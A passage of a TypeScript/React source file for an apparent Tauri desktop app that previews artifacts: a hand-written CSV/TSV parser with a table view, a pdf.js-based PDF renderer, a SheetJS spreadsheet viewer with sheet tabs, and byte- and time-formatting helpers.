        <div className="rail-muted artifact-table-note">
          {note}
          {body.length > MAX_TABLE_ROWS ? t(" Showing first {max} of {n} rows.", { max: MAX_TABLE_ROWS, n: body.length }) : ""}
        </div>
      )}
    </div>
  );
}

// Minimal RFC-4180-ish CSV parsing: quoted fields, escaped quotes, CRLF. TSV via tab sniffing.
function parseCsv(text: string): string[][] {
  const delim = text.includes("\t") && !text.split("\n")[0]?.includes(",") ? "\t" : ",";
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (quoted) {
      if (ch === '"') {
        if (text[i + 1] === '"') {
          cell += '"';
          i++;
        } else quoted = false;
      } else cell += ch;
    } else if (ch === '"') quoted = true;
    else if (ch === delim) {
      row.push(cell);
      cell = "";
    } else if (ch === "\n" || ch === "\r") {
      if (ch === "\r" && text[i + 1] === "\n") i++;
      row.push(cell);
      cell = "";
      rows.push(row);
      row = [];
    } else cell += ch;
  }
  if (cell !== "" || row.length) {
    row.push(cell);
    rows.push(row);
  }
  return rows.filter((r) => r.some((c) => c !== ""));
}

function CsvTable({ text }: { text: string }) {
  const { t } = useI18n();
  const rows = parseCsv(text);
  if (!rows.length) return <div className="rail-muted artifact-table-note">{t("Empty file.")}</div>;
  return <GridTable rows={rows} />;
}

// xlsx/xls preview via SheetJS (loaded on demand — it's a heavy module): sheet tabs + a capped
// grid. Real spreadsheet work belongs in Numbers/Excel via "Open in default app".
// WKWebView has no inline PDF plugin (<embed> shows a gray pane in the Tauri shell), so we
// rasterize pages with pdf.js onto stacked canvases — same lazy-chunk pattern as SheetViewer.
function PdfViewer({ dataUrl }: { dataUrl: string }) {
  const { t } = useI18n();
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(true);
  const holder = useRef<HTMLDivElement | null>(null);

  useEffect(() => {
    let cancelled = false;
    setError("");
    setLoading(true);
    const base64 = dataUrl.split(",")[1] || "";
    import("pdfjs-dist")
      .then(async (pdfjs) => {
        pdfjs.GlobalWorkerOptions.workerSrc = pdfWorkerUrl;
        const bytes = Uint8Array.from(atob(base64), (c) => c.charCodeAt(0));
        const doc = await pdfjs.getDocument({ data: bytes }).promise;
        const el = holder.current;
        if (cancelled || !el) return;
        el.innerHTML = "";
        const width = el.clientWidth || 640;
        const dpr = window.devicePixelRatio || 1;
        for (let i = 1; i <= doc.numPages; i++) {
          const page = await doc.getPage(i);
          const base = page.getViewport({ scale: 1 });
          const viewport = page.getViewport({ scale: (width / base.width) * dpr });
          const canvas = document.createElement("canvas");
          canvas.width = viewport.width;
          canvas.height = viewport.height;
          canvas.className = "artifact-pdf-page";
          await page.render({ canvasContext: canvas.getContext("2d")!, viewport }).promise;
          if (cancelled) return;
          el.appendChild(canvas);
        }
        setLoading(false);
      })
      .catch((e) => !cancelled && setError(String(e?.message || e)));
    return () => {
      cancelled = true;
    };
  }, [dataUrl]);

  if (error) return <div className="rail-error artifact-table-note">{t("Could not render PDF: {error}", { error })}</div>;
  return (
    <div className="artifact-pdfjs">
      {loading && <div className="rail-muted artifact-table-note">{t("Rendering PDF…")}</div>}
      <div ref={holder} />
    </div>
  );
}

function SheetViewer({ dataUrl }: { dataUrl: string }) {
  const { t } = useI18n();
  const [sheets, setSheets] = useState<{ name: string; rows: unknown[][] }[] | null>(null);
  const [error, setError] = useState("");
  const [active, setActive] = useState(0);

  useEffect(() => {
    let cancelled = false;
    setSheets(null);
    setError("");
    setActive(0);
    const base64 = dataUrl.split(",")[1] || "";
    import("xlsx")
      .then((XLSX) => {
        if (cancelled) return;
        const wb = XLSX.read(base64, { type: "base64" });
        setSheets(
          wb.SheetNames.map((name) => ({
            name,
            rows: XLSX.utils.sheet_to_json(wb.Sheets[name], { header: 1, defval: "" }) as unknown[][],
          })),
        );
      })
      .catch((e) => !cancelled && setError(String(e?.message || e)));
    return () => {
      cancelled = true;
    };
  }, [dataUrl]);

  if (error) return <div className="rail-error artifact-table-note">{t("Could not parse spreadsheet: {error}", { error })}</div>;
  if (!sheets) return <div className="rail-muted artifact-table-note">{t("Parsing spreadsheet…")}</div>;
  const sheet = sheets[active];
  return (
    <div className="sheet-viewer">
      {sheets.length > 1 && (
        <div className="sheet-tabs">
          {sheets.map((s, i) => (
            <button key={s.name} className={"sheet-tab" + (i === active ? " active" : "")} onClick={() => setActive(i)}>
              {s.name}
            </button>
          ))}
        </div>
      )}
      {sheet.rows.length ? <GridTable rows={sheet.rows} /> : <div className="rail-muted artifact-table-note">{t("Empty sheet.")}</div>}
    </div>
  );
}

function formatBytes(bytes: number): string {
  if (!Number.isFinite(bytes)) return "";
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
}

function formatTime(epochSeconds: number): string {
  if (!epochSeconds) return "";
  return new Date(epochSeconds * 1000).toLocaleTimeString(undefined, { hour: "numeric", minute: "2-digit" });
}
